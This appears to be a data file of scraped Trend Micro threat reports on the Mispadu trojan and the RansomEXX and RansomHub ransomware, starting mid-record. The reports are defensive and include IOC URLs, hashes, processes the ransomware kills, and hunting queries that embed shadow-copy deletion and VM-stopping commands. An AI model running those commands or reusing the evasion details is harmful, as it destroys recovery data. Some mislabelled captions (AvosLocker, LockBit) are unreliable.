indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":79,"metadata":{"source":"blog","platform":"trendmicro","filename":"Magniber"}}
{"id":194,"title":"Mispadu Banking Trojan Resurfaces | Trend Micro (US)","publish_date":null,"link":"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/mispadu-banking-trojan-resurfaces","clean_text":"Mispadu Banking Trojan Resurfaces Additional insights and analysis by Don Ladores and Raphael Centeno Recent spam campaigns leading to URSA/Mispadu banking trojan (detected by Trend Micro as TrojanSpy.\nWin32.MISPADU.\nThis attack targets systems with Spanish and Portuguese as system languages.\nIt is also likely that they have targets similar to previous Mispadu attacks where users from Mexico, Spain, Portugal, and other nearby regions were targeted.\nThis behavior is in line with past Mispadu schemes, such as the one where spam emails for fake discount coupons were used as bait.\nAnalysis of the campaigns For this particular case, Mispadu’s entry vector is spam, similar to past campaigns involving the malware.\nBy sending messages that refer to overdue invoices, attackers create a seemingly urgent situation that then persuades receivers to download a .zip file from malicious URLs.\nThis zip file contains an MSI (Microsoft Installer file) that has a VBScript.\nThis is followed by three layers of obfuscation that, when deobfuscated, reveal the final VBScript file that executes an AutoIT Loader/Injector.\nThe final VBScript also retrieves data on the operating system version.\nIf the script detects a virtual environment such as the following, the script terminates its execution: - Hyper-V - VirtualBox - VMWare It also inspects whether the system is using any of the following languages: | Language | Language Code | | Spanish – Spain (Traditional) | 1034 | | Portuguese – Brazil | 1046 | | Spanish – Mexico | 2058 | | Portuguese – Portugal | 2070 | | Spanish | 58378, 3082 | As aforementioned, the attackers are targeting users whose machines are set to use these identified languages.\nIf the system is using a different language ID from those listed, the attack process stops.\nIt also terminates the attack if the computer name is equal to “JOHN-PC.”\nThe final VBScript also loads the AutoIT file, which loads into the memory the final payload: a Delphi file containing the trojan code and processes.\nThe Delphi binary executes a browser banking overlay that steals the victim’s data and uses the name and logo of legitimate banks.\nFigures 1-2.\nFake banking overlays using logos of legitimate banks The binary also has two legitimate tools, NirSoft’s WebBrowserPassView and Mail PassView, which can collect user’s data.\nDelving deeper into related attacks, we analyzed indicators of compromise (IOCs) shared in a Twitter post by CronUp Red Team and Threat Intelligence Leader Germán Fernández.\nThe tweet shared information such as open-dir logs supposedly used by the malware.\nUsing this information, we were able to analyze related malicious files and dig up some possible exfiltration sites (URLs) from the samples we analyzed.\nThis list is featured in the IOC portion.\nBehavior-wise, the results of the analysis echo Tavares’ findings.\nBanking on protection against spam As institutions directly handling finances, banks are attractive targets for cybercriminals who are after monetary gain.\nTrojans are one of the tools threat actors use to steal from users of banking systems, and spam is one of the ways that they are propagated.\nTo avoid compromise brought about by malicious emails, the following steps are recommended: - Never open links or download attachments from emails from untrusted sources. -\nCheck if the sender’s email address is spoofed. -\nInspect the email for grammatical errors or misspelled words, which are common in spam emails. -\nContact the companies that supposedly sent the emails to verify that the messages came from them.\nHere are some recommended security solutions for protecting yourself from spam: - Trend Micro™ Email Security – protects systems against spam, phishing, Business Email Compromise (BEC), and other email threats. -\nTrend Micro™ Deep Discovery™ Email Inspector – has an optimal gateway module that filters inbound messages based on senders, spam and phishing filters, and content.\nIndicators of Compromise URLs - hxxp://01fckgwxqweod01.ddns.net - hxxp://01odinxqwefck01.ddns.net - hxxp://02fckgwxqweod02.ddnsking.com - hxxp://02odinxqwefck02.ddnsking.com - hxxp://03fckgwxqweod03.3utilities.com - hxxp://03odinxqwefck03.3utilities.com - hxxp://04fckgwxqweod04.bounceme.net - hxxp://04odinxqwefck04.bounceme.net - hxxp://05fckgwxqweod05.freedynamicdns.net - hxxp://05odinxqwefck05.freedynamicdns.net - hxxp://06fckgwxqweod06.freedynamicdns.org - hxxp://06odinxqwefck06.freedynamicdns.org - hxxp://07fckgwxqweod07.gotdns.ch - hxxp://07odinxqwefck07.gotdns.ch - hxxp://08fckgwxqweod08.hopto.org - hxxp://08odinxqwefck08.hopto.org - hxxp://09fckgwxqweod09.myddns.me - hxxp://09odinxqwefck09.myddns.me - hxxp://10fckgwxqweod10.myftp.biz - hxxp://10odinxqwefck10.myftp.biz - hxxp://11fckgwxqweod11.myftp.org - hxxp://11odinxqwefck11.myftp.org - hxxp://12fckgwxqweod12.ddns.net - hxxp://12odinxqwefck12.ddns.net - hxxp://13fckgwxqweod13.ddnsking.com - hxxp://13odinxqwefck13.ddnsking.com - hxxp://14fckgwxqweod14.3utilities.com - hxxp://14odinxqwefck14.3utilities.com - hxxp://15fckgwxqweod15.bounceme.net - hxxp://15odinxqwefck15.bounceme.net - hxxp://16fckgwxqweod16.freedynamicdns.net - hxxp://16odinxqwefck16.freedynamicdns.net - hxxp://17fckgwxqweod17.freedynamicdns.org - hxxp://17odinxqwefck17.freedynamicdns.org - hxxp://18fckgwxqweod18.gotdns.ch - hxxp://18odinxqwefck18.gotdns.ch - hxxp://19fckgwxqweod19.hopto.org - hxxp://19odinxqwefck19.hopto.org - hxxp://20fckgwxqweod20.myddns.me - hxxp://20odinxqwefck20.myddns.me - hxxp://21fckgwxqweod21.myftp.biz - hxxp://21odinxqwefck21.myftp.biz - hxxp://22fckgwxqweod22.myftp.org - hxxp://22odinxqwefck22.myftp.org - hxxp://23fckgwxqweod23.ddns.net - hxxp://23odinxqwefck23.ddns.net - hxxp://24fckgwxqweod24.ddnsking.com - hxxp://24odinxqwefck24.ddnsking.com - hxxp://25fckgwxqweod25.3utilities.com - hxxp://25odinxqwefck25.3utilities.com - hxxp://26fckgwxqweod26.bounceme.net - hxxp://26odinxqwefck26.bounceme.net - hxxp://27fckgwxqweod27.freedynamicdns.net - hxxp://27odinxqwefck27.freedynamicdns.net - hxxp://28fckgwxqweod28.freedynamicdns.org - hxxp://28odinxqwefck28.freedynamicdns.org - hxxp://29fckgwxqweod29.gotdns.ch - hxxp://29odinxqwefck29.gotdns.ch - hxxp://30fckgwxqweod30.hopto.org - hxxp://30odinxqwefck30.hopto.org - hxxp://31fckgwxqweod31.myddns.me - hxxp://31odinxqwefck31.myddns.me - hxxp://87.98.137.173/ - hxxp://87.98.137.173/gt21.php - hxxp://87.98.137.173/k1oa - hxxp://87.98.137.173/m/k1 | SHA-256 | Trend Micro Pattern Detection | | | Trojan.\nWin32.MISPADOENC.\n| | 073f9d7bbdca94b3e6f5e572522e8e | Trojan.\nVBS.MISPADU.THIAHBO | | 0d57869a4d6509a13ff48af46492f1 | Trojan.\nAutoIt.\nMISPADO.THIADBO | | 1590e809dbad3c77d555e135412553 | Trojan.\nVBS.MISPADU.THIADBO | | 23892054f9494f0ee6f4aa8749ab3e | Trojan.\nVBS.MISPADU.THIAHBO | | | Trojan.\nVBS.MISPADU.THIAHBO | | 400b411a9bffd687c5e74f51d43b7d | HKTL_MAILPASSVIEW | | | Trojan.\nVBS.MISPADU.THIADBO | | 5b91c8acffe1980653718a493e24bd | Trojan.\nVBS.MISPADU.THIAHBO | | 779e52e5dd7f28a6d51a333f651da4 | Trojan.\nVBS.MISPADU.THIADBO | | 93488eab403fafb3d8e10d38c80f0a | Trojan.\nVBS.MISPADU.THIAHBO | | c96b32d44a44cd6f1496f88bc22739 | TrojanSpy.\nWin32.MISPADU.\n| | | Trojan.\nWin32.MISPADO.THENC | | de7168cd978a33926ea7ffad027cc1 | Trojan.\nWin32.MISPADU.THIADBO | | | HackTool.\nWin32.NirsoftPT.SM | | | HackTool.\nWin32.NirsoftPT.SM | | | Trojan.\nVBS.MISPADU.THIAHBO | Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":60,"metadata":{"source":"blog","platform":"trendmicro","filename":"Mispadu-Banking-Trojan"}}
{"id":195,"title":"Ransomware Spotlight: RansomEXX | Trend Micro (US)","publish_date":"2022-03-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-ransomexx","clean_text":"Ransomware Spotlight: RansomEXX Top affected industries and countries Our telemetry shows data on RansomEXX activity or attack attempts from March 31, 2021 to March 31, 2022.\nWe observed RansomEXX activity from all over the globe, but the heaviest concentration was in USA in France followed by Brazil.\nThe reason behind this observation is the 2021 RansomEXX attack on a major hardware manufacturer in Taiwan.\nFigure 1.\nCountries with the highest number of attack attempts for the RansomEXX ransomware (March 31, 2021 to March 31, 2022) Source: Trend Micro™ Smart Protection Network™ ™ Based on our detections, RansomEXX was most active in the manufacturing sector, followed by the education and banking sectors.\nOverall, the differences are relatively slim given the small sample size.\nFigure 2.\nIndustries with the highest number of attack attempts for AvosLocker ransomware (March 31, 2021 to March 31, 2022)Source: Trend Micro™ Smart Protection Network™ Infection chain and techniques Initial Access - RansomEXX has been known to use Malspam to infiltrate machines and deliver multiple tools and related malware before finally deploying the actual ransomware payload.\nExecution and Exfiltration - The threat actors make use of different pieces of malware for execution.\nFrom our telemetry, we saw IcedID, TrickBot, Cobalt Strike beacons, and PyXie RAT.\nThese are known to be used in other campaigns as well.\nPyXie RAT also has the capability to exfiltrate data and obtain information from the target machine.\nLateral Movement - For lateral movement, multiple server message block (SMB) hits were seen on our telemetry.\nThis has been used to deliver VATET loader.\nDiscovery - Similar to other campaigns, RansomEXX also makes use of Mimikatz and LaZagne to extract credentials from the target machine.\nOther technical details - It avoids encrypting the following strings in their file path: - \\windows\\system32\\ - \\windows\\syswow64\\ - \\windows\\system\\ - \\windows\\winsxs\\ - \\appdata\\roaming\\ - \\appdata\\local\\ - \\appdata\\locallow\\ - \\all users\\microsoft\\ - \\inetpub\\logs\\ - :\\boot\\ - :\\perflogs\\ - :\\programdata\\ - :\\drivers\\ - :\\wsus\\ - :\\efstmpwp\\ - :\\$recycle.bin\\ - crypt_detect - cryptolocker - ransomware - ProgramW6432 - %ProgramFiles% - It avoids encrypting the following files with strings in their file name: - bootsect.bak - iconcache.db - thumbs.db - debug.txt - boot.ini - desktop.ini - autorun.inf - ntuser.dat - ntldr - ntdetect.com - bootfont.bin - !{\nTargeted Company Acronym}_READ_ME!.txt - ransom - ransomware - It avoids encrypting files with the following extensions: - .ani - .cab - .cpl - .diagcab - .diagpkg - .dll - .drv - .hlp - .icl - .icns - .ico - .iso - .ics - .lnk - .idx - .mod - .mpa - .msc - .msp - .msstyles - .msu - .nomedia - .ocx - .prf - .rtp - .scr - .shs - .spl - .sys - .theme - .thempack - .exe - .bat - .cmd - .url - .mui - .{Targeted Company Acronym - It terminates the following processes: - javaw - java - sage - ks_action - ks_email - ks_copy - ks_sched - ks_web - ks_im - ks_db - pvxiosvr - pvxwin32 - xfssvccon - wordpad - wlmail - onenote - om8start - om8 - ocssd - ocomm - ocautoupds - notepad - notepad++ - node - nginx - ncsvc - ncs - mydesktopservice - mydesktopqos - mspub - msaccess - mongod - metiix - mdccom - mbarw - i_view32 - infopath - exchange - excel - encsvc - duplicati - devenv - dbsnmp - dbeng50 - database - backup - atom - arw - agntsvcencsvc - agntsvcagntsvc - agntsvc - ARSM - AcrSch2Svc - Acronis VSS Provider - AcronisAgent - AcronixAgent - Antivirus - MSSQL$TPS - MSSQL$TPSAMA - MSSQL$VEEAMSQL2008R2 - MSSQL$VEEAMSQL2012 - MSSQLFDLauncher - MSSQLFDLauncher$PROFXENGAGEMENT - MSSQLFDLauncher$SBSMONITORING - MSSQLFDLauncher$SHAREPOINT - MSSQLFDLauncher$SQL_2008 - MSSQLFDLauncher$SYSTEM_BGC - MSSQLFDLauncher$TPS - MSSQLFDLauncher$TPSAMA - MSSQLSERVER - MSSQLServerADHelper - MSSQLServerADHelper100 - MSSQLServerOLAPService - McAfeeEngineService - McAfeeFramework - McAfeeFrameworkMcAfeeFramework - McShield - McTaskManager - MongoDB - MsDtsServer - MsDtsServer100 - MsDtsServer110 - MySQL57 - MySQL80 - NetMsmqActivator - OracleClientCache80 - OracleServiceXE - TrueKey - TrueKeyScheduler - TrueKeyServiceHelper - UI0Detect - Veeam Backup Catalog Data Service - VeeamBackupSvc - VeeamBrokerSvc - VeeamCatalogSvc - VeeamCloudSvc - VeeamDeploySvc - VeeamDeploymentService - VeeamEnterpriseManagerSvc - winword - vmwp - vmware-vmx - vmms - vmconnect - vmcompute - visio - veeam - tv_x64 - tv_w32 - tomcat - thunderbird - thebat64 - thebat64 - teamviewer - tbirdconfig - tasklist - BackupExecAgentAccelerator - BackupExecAgentBrowser - BackupExecDeviceMediaService - BackupExecJobEngine - BackupExecManagementService - BackupExecRPCService - BackupExecVSSProvider - DCAgent - DbxSvc - EPSecurityService - EPUpdateService - ESHASRV - EhttpSrv - Enterprise Client Service - EraserSvc11710 - EsgShKernel - FA_Scheduler - IISAdmin - IMAP4Svc - KAVFS - KAVFSGT - MBAMService - MBEndpointAgent - MSExchangeAB - MSExchangeADTopology - MSExchangeAntispamUpdate - MSExchangeES - MSExchangeEdgeSync - MSExchangeFBA - MSExchangeFDS - MSExchangeIS - MSExchangeMGMT - OracleXETNSListener - PDVFSService - POP3Svc - RESvc - ReportServer - ReportServer$SQL_2008 - ReportServer$SYSTEM_BGC - ReportServer$TPS - ReportServer$TPSAMA - SAVAdminService - SAVService - SDRSVC - SMTPSvc - SNAC - SQL Backups - SQLAgent$BKUPEXEC - SQLAgent$CITRIX_METAFRAME - SQLAgent$CXDB - SQLAgent$ECWDB2 - SQLAgent$PRACTTICEBGC - SQLAgent$PRACTTICEMG - SQLAgent$PROD - SQLAgent$PROFXENGAGEMENT - SQLAgent$SBSMONITORING - SQLAgent$SHAREPOINT - SQLAgent$SOPHOS - SQLAgent$SQLEXPRESS - SQLAgent$SQL_2008 - SQLAgent$SYSTEM_BGC - SQLAgent$TPS - SQLAgent$TPSAMA - VeeamHvIntegrationSvc - VeeamMountSvc - VeeamNFSSvc - VeeamRESTSvc - VeeamTransportSvc - W3Svc - WRSVC - Zoolz 2 Service - bedbg - ekrn - kavfsslp - klnagent - macmnsvc - masvc - mfefire - taskmgr - synctime - sublime_text - stream - steam - sqbcoreservice - screenconnect - ruby - qbw32 - pythonw - python - processhacker - powerpnt - postgres - php - outlook - oracle - MSExchangeMTA - MSExchangeMailSubmission - MSExchangeMailboxAssistants - MSExchangeMailboxReplication - MSExchangeProtectedServiceHost - MSExchangeRPC - MSExchangeRepl - MSExchangeSA - MSExchangeSRS - MSExchangeSearch - MSExchangeServiceHost - MSExchangeThrottling - MSExchangeTransport - MSExchangeTransportLogSearch - MSOLAP$SQL_2008 - MSOLAP$SYSTEM_BGC - MSOLAP$TPS - MSOLAP$TPSAMA - MSSQL$BKUPEXEC - MSSQL$ECWDB2 - MSSQL$PRACTICEMGT - MSSQL$PRACTTICEBGC - MSSQL$PROD - MSSQL$PROFXENGAGEMENT - MSSQL$SBSMONITORING - MSSQL$SHAREPOINT - MSSQL$SOPHOS - MSSQL$SQLEXPRESS - MSSQL$SQL_2008 - MSSQL$SYSTEM_BGC - SQLAgent$VEEAMSQL2008R2 - SQLAgent$VEEAMSQL2012 - SQLBrowser - SQLSERVERAGENT - SQLSafeOLRService - SQLTELEMETRY - SQLTELEMETRY$ECWDB2 - SQLWriter - SQLsafe Backup Service - SQLsafe Filter Service - SamSs - SepMasterService - ShMonitor - SmcService - Smcinst - SntpService - Sophos Agent - Sophos AutoUpdate Service - Sophos Clean Service - Sophos Device Control Service - Sophos File Scanner Service - Sophos Health Service - Sophos MCS Agent - Sophos MCS Client - Sophos Message Router - Sophos Safestore Service - Sophos System Protection Service - Sophos Web Control Service - SstpSvc - Symantec System Recovery - TmCCSF - mfemms - mfevtp - mozyprobackup - msftesql$PROD - ntrtscan - sacsvr - sophossps - svcGenericHost - swi_filter - swi_service - swi_update - swi_update_64 - tmlisten - wbengine MITRE tactics and techniques | Initial Access | Execution | Defense Evasion | Discovery | Impact | |---|---|---|---|---| T1078 - Valid Accounts | T1059.003 - Command-Line Interface: Windows Command Shell | T1140 - Deobfuscate/Decode Files or Information T1562.001 - Impair Defenses: Disable or Modify Tools | T1082 - System Information Discovery T1049 - System Network Connections Discovery T1083 - File and Directory Discovery T1486 - Data encrypted for impact | T1489 - Service stop T1490 -Inhibit system recovery | Summary of malware, tools, and exploits used Security teams can watch out for the presence of the following malware tools and exploits that are typically used in RansomEXX attacks: | Initial Access | Execution | Discovery | Lateral Movement | Impact | |---|---|---|---|---| | | | | | | | ||| | |||| | |||| | Recommendations RansomEXX is not as active as it had been in 2020, when its consecutive attacks made it one of the newer ransomware families to watch out for.\nHowever, being a highly targeted and human-operated ransomware, its attacks affect its victims and their reputation significantly.\nThe combination of memory-based techniques, legitimate Windows tools, and post-intrusion contribute a lot to RansomEXX’s successes.\nPreventing the attacks from the outset is key to avoiding the worst of ransomware campaigns.\nOrganizations should learn from past RansomEXX campaigns and be vigilant against initial access tactics.\nUsers should be wary of enabling macros, and of documents that prompt them to do so.\nTo help defend systems against similar threats, organizations can establish security frameworks that can allocate resources systematically for establishing solid defenses against ransomware.\nHere are some best practices that can be included in these frameworks: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nMake an audit of event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that only executes legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, back up, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDetect early signs of an attack such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by AI and machine learning.\nTrain and test - Regularly train and assess employees on security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions that can detect malicious components and suspicious behavior can also help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The IOCs for this article can be found here.\nActual indicators might vary per attack.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":62,"metadata":{"source":"blog","platform":"trendmicro","filename":"RansomEXX"}}
{"id":196,"title":"Ransomware Spotlight: Ransomhub | Trend Micro (US)","publish_date":"2024-02-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-ransomhub","clean_text":"Ransomware Spotlight: Ransomhub Initial Access - The RansomHub ransomware group use spear-phishing voice scams for initial access.\nThe cybercriminals use social engineering to orchestrate victim account password resets, employing speakers with a convincing American accent to lure victims.\nRansomHub also possibly uses compromised VPN accounts.\nExecution - Operators behind RansomHub use PsExec to execute commands remotely on the victim’s machine.\nThey have also been observed to use Powershell scripts to execute commands related to credential access, discover remote systems, establish SSH connections. -\nThey have also been observed to use Python scripts to establish SSH connections, transfer the encryptor via Secure File Transfer Protocol (SFTP), and execute the encryptor simultaneously across multiple servers.\nPersistence - RansomHub uses a local account to maintain access and adds the created user to administrator groups to maintain elevated access.\nDefense Evasion - RansomHub drops and executes a batch file named disableAV.bat detected as Trojan.\nBAT.KAPROCHANDLER.A. It copies and executes the binary used to terminate and delete antivirus-related processes and files.\nThe binary used, detected as STONESTOP, uses a signed driver, detected as POORTRY, to delete files and terminate processes that are related to antivirus products. -\nThe ransomware also uses another batch file to delete multiple registry subkeys and entries intended to bypass virus and threat protection settings in Windows. -\nRansomHub also uses TDSSKiller to disable antivirus or EDR solutions in the target system and TOGGLEDEFENDER to disable Windows Defender. -\nThe ransomware group also uses EDR Kill Shifter that functions as a loader executable that utilizes the Bring Your Own Vulnerable Driver (BYOVD) technique.\nIt exploits different vulnerable drivers to disable EDR protection. -\nThe ransomware group also uses IOBit Unlocker to unlock files and folders that are locked by other processes or programs.\nCredential Access - RansomHub uses MIMIKATZ, LaZagne, and SecretServerSecretStealer to retrieve passwords and credentials on their victim’s machines. -\nThe ransomware group has also been observed to exploit the Veeam Backup & Replication component vulnerability CVE-2023-27532, where they connected to the Veeam.Backup.Service.exe on TCP/9401, created a network share, and then created and executed a Powershell script to dump credentials from the Veeam database to a text file.\nThe group was also seen using Veeamp which is a credential dumping tool specifically designed to extract credentials from a SQL database utilized by Veeam backup management software. -\nA sample from the ransomware group has also been observed to conduct a brute force attack on the domain controller which was followed by a ntlmv1 logon to the domain controller.\nThe group has also been observed extracting the NTDS.dit file which is a database that stores the Active Directory data including users, groups, security descriptors and password hashes. -\nRansomHub also uses a PowerShell script that interacts with the CyberArk Privileged Access Security (PAS) solution to pull account information from safes and export it to a CSV file.\nDiscovery - RansomHub operators use NetScan to discover and retrieve information about network devices.\nThey also use Advanced Port Scanner to scan for open ports on network computers.\nLateral Movement - RansomHub ransomware uses the cmd command xcopy/copy to transfer the binary and driver used to terminate and delete anti-virus related processes and files, respectively.\nThe group employs a PowerShell script to connect to a vCenter Server, retrieve all ESXi hosts, and configures the SSH service on each host to start automatically, enabling external SSH connections.\nThe script also has the capability to reset the ESXi root user password and then disconnect from the vCenter Server. -\nRansomHub operators also use a SMB spreader that uses Impacket, which was provided to RansomHub affiliates.\nThe SMB spreader runs a specified ransomware executable over the affected system’s local network. -\nThe group also used SFTP to transfer the encryptor.\nCommand and Control - RansomHub operators use Atera, Splashtop, AnyDesk, Ngrok, Screen Connect and Remmina to to gain access on victim machines remotely.\nImpact - RansomHub ransomware uses two encryption algorithms to encrypt target files: ECDH and AES.\nThe ransomware then appends the 32-byte master public key from its configuration to the end of each encrypted file.\nThe ransomware binary requires a -pass argument with a 32-byte passphrase to be specified when the ransomware is executed.\nThe 32-byte passphrase is used to decrypt an embedded configuration during runtime which contains the file extensions, file names, and folders to avoid, processes and services to terminate, as well as compromised login accounts.\nExfiltration - RansomHub ransomware has been detected using the third-party tool and web-service RClone to exfiltrate to stolen information.\nMITRE tactics and techniques | Initial Access | Execution | Persistence | Privilege Escalation | Defense Evasion | Credential Access | Discovery | Lateral Movement | Command and Control | Impact | Exfiltration | |---|---|---|---|---|---|---|---|---|---|---| T1078 - Valid Accounts T1566.004 - Phishing: Spearphishing Voice | T1059.001 - Command and Scripting Interpreter: PowerShell T1059.006 - Command and Scripting Interpreter: Python T1059.003 - Command and Scripting Interpreter: Windows Command Shell | T1136.001 - Create Account: Local Account T1098 - Account Manipulation T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1547 - Boot or Logon Autostart Execution | T1078.003 - Valid Accounts: Local Accounts T1134.001 - Access Token Manipulation: Token Impersonation/Theft | T1480 - Execution Guardrails T1112 - Modify Registry T1027.013 - Obfuscated Files or Information: Encrypted/Encoded File T1564.003 - Hide Artifacts: Hidden Window T1070.001 - Clear Windows Event Logs T1562.006 - Impair Defenses: Indicator Blocking T1222.001 - Windows File and Directory Permissions Modification T1562.009 - Impair Defenses: Safe Mode Boot | T1003 - OS Credential Dumping T1003.003 - OS Credential Dumping: NTDS T1110 - Brute Force T1110.003 - Brute Force: Password Spraying T1003.001 - OS Credential Dumping: LSASS Memory T1555.005 - Credentials from Password Stores: Password Managers | T1057 - Process Discovery T1082 - System Information Discovery T1083 - File and Directory Discovery T1082 - System Information Discovery T1087.001 - Account Discovery: Local Account T1135 - Network Share Discovery | T1570 - Lateral Tool Transfer T1021.004 - Remote Services: SSH | T1105 - Ingress Tool Transfer | T1486 - Data Encrypted for Impact T1490 - Inhibit System Recovery T1489 - Service Stop T1529 - System Shutdown/Reboot | T1567.002 - Exfiltration to Cloud Storage | Summary of malware, tools, and exploits used Security teams can watch out for the presence of the following malware tools and exploits that are typically used in LockBit attacks: | Execution | Privilege Escalation | Credential Access | Lateral Movement | Discovery | Command and Control | Defense Evasion | Exfiltration | Impact | |---|---|---|---|---|---|---|---|---| | | | | | | | | | Top affected countries and industries from Trend Micro threat intelligence In this section, we outline the activity of both the RansomHub ransomware and the Knight ransomware as investigations suggest that the two are related.\nRansomHub was first reported in February 2024, but the first instance of an attempted attack in Trend Micro-covered systems was in April 2024.\nThe Knight ransomware, on the other hand, has been active since January this year, when we begin tracking in our telemetry.\nFigure 2.\nA monthly breakdown of attempted attacks from Knight ransomware (left) and RansomHub ransomware (right) from January to September 2024 Knight ransomware’s top targeted countries include Brazil, the United States, Turkiye, Ireland, and Israel, while RansomHub focused their efforts in targeting enterprises from the United States and Malaysia.\nFigure 3.\nA breakdown of the top countries targeted by the Knight (left) and RansomHub (right) ransomware groups from January to September 2024) While many customers chose not to specify the industry in which they belong, data from those that did reveal that Knight ransomware targeted financial institutions the most, while RansomHub ransomware targeted the education sector the most.\nFigure 4.\nA breakdown of the top industries targeted by the Knight (left) and RansomHub (right) ransomware groups from January to September 2024) Targeted regions and industries according to RansomHub ransomware’s leak site This section looks at data based on attacks recorded on the leak site of the RansomHub ransomware and a combination of our open-source intelligence (OSINT) research and an investigation from July 2023 to September 2024.\nThe gang has so far added at least 338 victims to its leak site, but the actual victim count is likely higher.\nOf the total number of revealed victims, the RansomHub ransomware targeted enterprises in the North American region the most.\nFigure 5.\nThe distribution by region of the RansomHub ransomware’s victim organizations, excluding victims with unknown locations Sources: RansomHub ransomware’s leak site and Trend Micro’s OSINT research (July 2023 - September 2024) RansomHub targeted enterprises in the United State the most.\nThe gang launched attacks on other countries fewer times, but their total of 338 victims comes from a wide range of at least 58 countries.\nFigure 6.\nThe top 10 countries targeted by the RansomHub ransomware Sources: RansomHub ransomware’s leak site and Trend Micro’s OSINT research (July 2023 - September 2024) Majority of the RansomHub ransomware’s victim organizations were small businesses.\nThe gang targeted medium businesses 65 times, and large enterprises only 38 times.\nFigure 7.\nThe distribution by organization size of RansomHub’s victim organizations Sources: RansomHub ransomware’s leak site and Trend Micro’s OSINT research (July 2023 - September 2024) There are no outstanding sectors that RansomHub prefers to target, as their victimology by industry is spread out across sectors; however, the sector with the most attack counts as revealed by their leak site are from the IT sector.\nFigure 8.\nA breakdown of the top 10 industries targeted by RansomHub ransomware attacks Sources: RansomHub ransomware’s leak site and Trend Micro’s OSINT research (July 2023 - September 2024) Trend Micro Vision One Threat Intelligence To stay ahead of evolving threats, Trend Micro customers can access a range of Intelligence Reports and Threat Insights within Trend Micro Vision One.\nThreat Insights helps customers stay ahead of cyber threats before they happen and better prepared for emerging threats.\nIt offers comprehensive information on threat actors, their malicious activities, and the techniques they use.\nBy leveraging this intelligence, customers can take proactive steps to protect their environments, mitigate risks, and respond effectively to threats.\nTrend Micro Vision One Intelligence Reports App [IOC Sweeping] The following can be searched in the Trend Vision One Intelligence Reports dashboard for IOC sweeping: - RansomHub Attacks Surge: New Anti-EDR Tactics Unveiled and AMADEY Infrastracture Connection - [Hot Threats]: New Indicators for RANSOMHUB Ransomware - - New RansomHub attack uses TDSKiller and LaZagne, disables EDR - StopRansomware: RansomHub Ransomware Trend Micro Vision One Threat Insights App Trend Vision One Hunting Query Trend Vision One customers can use the Search App to match or hunt the malicious indicators mentioned in this feature with data in their environment. -\nRansomHub Ransomware VSAPI Detections and Ransom Note: malName:(*RANSOMHUB* or *KNIGHT*) AND eventName: MALWARE_DETECTION AND FileFullPath:(\"*\\\\README_*\") - RansomHub Ransomware Process Execution: processCmd:\"/*cmd.exe /c iisreset.exe /stop*/\" AND processCmd:\"*powershell.exe -Command PowerShell -Command \"\\\"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\\\"\"*/\" AND processCmd:\"*powershell.exe -Command PowerShell -Command \"\\\"Get-VM | Stop-VM -Force\\\"\"*/\" More hunting queries are available for Vision One customers with Threat Insights Entitlement enabled.\nRecommendations RansomHub ransomware is the latest evidence that cybercriminals are easy to respawn and work together with other groups to maximize profits from their extortion schemes.\nIts links to the people behind BlackCat and Knight ransomware make it a formidable threat worth watching out for, especially as the group’s victimology in less than a year of activity suggests frequent and aggressive attacks.\nTo protect systems against RansomHub ransomware and other similar threats, organizations can implement security frameworks that allocate resources systematically to establish a strong defense strategy.\nThe following are some best practices that organizations can consider to help protect themselves from ransomware infections: Audit and 